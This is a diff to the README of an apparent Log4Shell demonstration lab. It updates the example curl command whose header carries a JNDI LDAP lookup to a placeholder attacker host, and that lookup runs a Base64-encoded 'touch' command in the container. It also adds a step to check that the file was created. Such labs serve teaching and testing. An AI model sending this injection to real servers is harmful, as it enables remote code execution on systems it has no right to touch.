@@ -36,10 +36,15 @@ Build the Docker image by yourself:
 
 - Then, trigger the exploit using:
 
-`curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'`
+`curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90ZWtpdW1fcHJ1ZWJh}'`
 
 - Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:
 
+
+
+- To confirm that the code execution was successful, notice that the file /tmp/tekium_prueba was created in the container running the vulnerable application:
+
+`docker exec tekiumlog4japp ls /tmp`
 
 # Commercial Support
 ![Tekium](https://github.com/unmanarc/uAuditAnalyzer2/blob/master/art/tekium_slogo.jpeg)
